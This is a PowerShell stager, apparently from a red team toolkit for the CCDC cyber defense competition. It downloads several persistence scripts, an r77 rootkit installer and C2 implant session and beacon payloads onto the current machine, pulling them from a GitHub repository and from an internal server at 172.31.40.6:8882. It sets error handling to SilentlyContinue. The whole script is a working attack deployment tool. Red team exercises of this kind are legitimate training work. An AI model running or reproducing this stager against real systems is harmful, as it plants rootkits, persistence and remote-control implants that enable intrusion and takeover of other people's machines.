# CCDC Phase 3 - Auto Deploy
# Downloads all Phase 3 scripts and implants to the current device in one shot.

$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Starting Phase 3 auto-deploy..." -ForegroundColor Cyan

$downloads = @(
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_COMBINED.ps1";           OutFile = "combined.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Persist_ClockworkChaos.ps1";  OutFile = "persist1.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Persist_GhostInTheWMI.ps1";   OutFile = "persist2.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Persist_PlantEverywhere.ps1";  OutFile = "persist3.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Persist_PlantEverywhere.ps1";  OutFile = "persist4.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Rootkit_r77Shadow.ps1";        OutFile = "r77.ps1" },
    @{ Uri = "https://172.31.40.6:8882/IMPLANT SESSION WINDOWS HTTP 8008";  OutFile = "ses08" },
    @{ Uri = "https://172.31.40.6:8882/IMPLANT BEACON WINDOWS HTTP 8007";   OutFile = "beac07" }
)

foreach ($item in $downloads) {
    Write-Host "[*] Downloading $($item.OutFile)..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $item.Uri -OutFile $item.OutFile -UseBasicParsing
        Write-Host "[+] $($item.OutFile) OK" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed: $($item.OutFile) - $_" -ForegroundColor Red
    }
}

Write-Host "[*] Auto-deploy complete." -ForegroundColor Cyan
